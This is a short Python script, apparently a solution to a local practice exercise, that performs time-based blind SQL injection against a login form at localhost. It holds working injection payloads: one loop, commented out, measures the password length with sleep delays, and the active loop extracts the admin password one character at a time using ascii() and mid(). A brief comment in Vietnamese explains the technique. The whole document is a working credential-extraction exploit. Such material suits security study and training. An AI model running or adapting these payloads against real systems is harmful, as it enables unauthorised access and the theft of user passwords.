import requests as r
from string import printable
import time

url = 'http://localhost:81/task2/time_based/?'
res = r.get(url).text
print(res)

# for i in range(1, 1000):
#     payload = f"username=admin&password=-1' or length(password) > {i} and sleep(1)-- -"
#     a = time.time()
#     res = r.get(url + payload)
#     print(time.time() - a)
#     if time.time() - a < 1:
#         print(i)
#         break\
length = 14
pwd = ''
for i in range(1, 15):
    for char in printable.replace("%", ""):
        payload = f"username=admin&password=-1' or username='admin' and ascii(mid(password,{i},1)) = '{ord(char)}' and sleep(1)-- -"
        # su dung ascii ket hop voi mid de lay tung ki tu cua password
        a = time.time()
        res = r.get(url + payload)
        if time.time() - a > 1:
            pwd += char
            print(pwd)